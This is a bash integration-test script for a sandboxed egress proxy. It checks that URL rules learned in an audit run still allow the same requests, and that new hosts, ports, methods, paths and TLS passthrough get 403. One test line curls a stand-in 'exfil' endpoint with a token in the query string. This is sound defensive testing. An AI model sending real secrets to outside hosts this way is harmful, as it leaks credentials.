#!/bin/bash
# Runs *inside* the sandbox, as the `run:` input of the restrict-mode half of
# test/integration-test-inspect-roundtrip.sh -- same role as
# test/inspect-restrict-scenarios.sh, but driven by whatever allowed_url_rules
# the audit half's own report generated, not a fixed list.
#
# ALLOW_TLS_RULES is cleared for this phase on purpose (see
# integration-test-inspect-roundtrip.sh): the URL rules learned from the audit
# run have to stand alone, so the TLS passthrough the audit run made must now
# be refused.
set -uo pipefail

FAILURES=0
S="curl -sS --max-time 10"
C="curl -sS -o /dev/null -w %{http_code} --max-time 10"

check_ok() {
  local label="$1" out="$2" want="$3"
  case "$out" in
    "$want"*) echo "  PASS  $label" ;;
    *)
      echo "  FAIL  $label -- got: $out"
      FAILURES=$((FAILURES + 1))
      ;;
  esac
}

check_status() {
  local label="$1" code="$2" want="$3"
  if [ "$code" = "$want" ]; then
    echo "  PASS  $label"
  else
    echo "  FAIL  $label -- expected $want, got $code"
    FAILURES=$((FAILURES + 1))
  fi
}

echo "=== [same as audit: HTTPS] ==="
OUT=$($S https://allowed.example.com/public/pkg.tgz)
check_ok "GET /public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [same as audit: varying paths under the learned prefix] ==="
$S https://allowed.example.com/public/a/one.tgz >/dev/null
$S https://allowed.example.com/public/b/two.tgz >/dev/null
echo "  PASS  varying paths under the learned prefix"

echo "=== [same as audit: POST] ==="
OUT=$($S -X POST https://api.example.com/v1/thing)
check_ok "POST /v1/thing" "$OUT" "API POST"

echo "=== [same as audit: plaintext on 9080] ==="
OUT=$($S http://allowed.example.com:9080/public/pkg.tgz)
check_ok "GET :9080/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [same as audit: TLS on 9443] ==="
OUT=$($S https://allowed.example.com:9443/private/secret)
check_ok "GET :9443/private/secret" "$OUT" "PRIVATE GET"

echo "=== [same as audit: query string dropped from the rule] ==="
OUT=$($S "https://blocked.example.com/exfil?token=SECRET-VALUE")
check_ok "GET blocked.example.com/exfil?token=..." "$OUT" "ROOT GET"

echo "=== [new: TLS passthrough, since ALLOW_TLS_RULES was cleared for phase 2] ==="
CODE=$($C --insecure https://tlspass.example.com/public/x)
check_status "GET tlspass.example.com (passthrough)" "$CODE" "403"

echo "=== [new: path outside the learned prefix] ==="
CODE=$($C https://allowed.example.com/private/other)
check_status "GET /private/other" "$CODE" "403"

echo "=== [new: method never observed on a URL that was] ==="
CODE=$($C -X POST https://allowed.example.com/public/pkg.tgz)
check_status "POST /public/pkg.tgz" "$CODE" "403"

echo "=== [new: host never observed] ==="
CODE=$($C https://wildcard.example.com/public/pkg.tgz)
check_status "GET wildcard.example.com" "$CODE" "403"

echo "=== [new: port never observed] ==="
CODE=$($C https://allowed.example.com:8443/public/pkg.tgz)
check_status "GET :8443/public/pkg.tgz" "$CODE" "403"

echo "=== End of round-trip scenarios: $FAILURES failure(s) ==="
exit "$FAILURES"
